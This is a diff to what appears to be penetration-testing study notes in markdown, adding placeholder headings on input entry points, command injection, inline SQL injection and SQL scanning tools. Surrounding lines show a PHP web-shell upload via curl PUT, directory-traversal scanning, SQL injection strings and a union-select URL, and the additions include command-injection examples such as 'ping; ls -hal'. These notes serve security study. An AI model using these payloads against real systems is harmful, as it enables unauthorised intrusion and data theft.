@@ -1057,6 +1057,29 @@ curl -v -X PUT -d '<?php system(*dollar-sign*_GET["cmd"]); ?>' http://*target*/t
 dotdotpwn.pl -m http -h *target* -M GET -o unix
 
 ```
+### identify data entry points
+
+get requests
+
+post requests
+
+cookies
+
+host, referer, and User-Agent are all injectible
+
+```
+insert links here
+
+```
+
+### try command injection
+
+```
+ping; ls -hal
+ping | ls -hal
+
+```
+
 
 ### plecost scan
 
@@ -1646,7 +1669,12 @@ Get the name and the vesion then look for exploits
 http://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/#gref
 
 Refer to the web application work book under SQL tab
-
+```
+SELECT
+INSERT
+UPDATE
+DELETE
+```
 Refer to the PWK workbook V1.3 under SQL injection
 
 ```
@@ -1660,6 +1688,18 @@ or 1=1--
 devnull' or '1
 ```
 First thing you do if you get an error message is google it and verify which sql language it could be associated with.
+
+```
+enter sql type
+
+```
+### Inline SQL injection
+
+Inject part of SQL into username field and the other part into Password field
+
+```
+
+```
 
 More tests
 
@@ -1755,6 +1795,12 @@ insert into myexploit values(load_file('/home/folder/1518.so'));
 http://*target-domain*/comment.php?id=738%20union%20select%201,2,3,4,table_name,%206%20FROM%20information_schema.tables
 
 ```
+### hp scrawlr
+
+### Sqlix
+
+### Zed Attack proxy
+
 
 
 ### SQLMAP
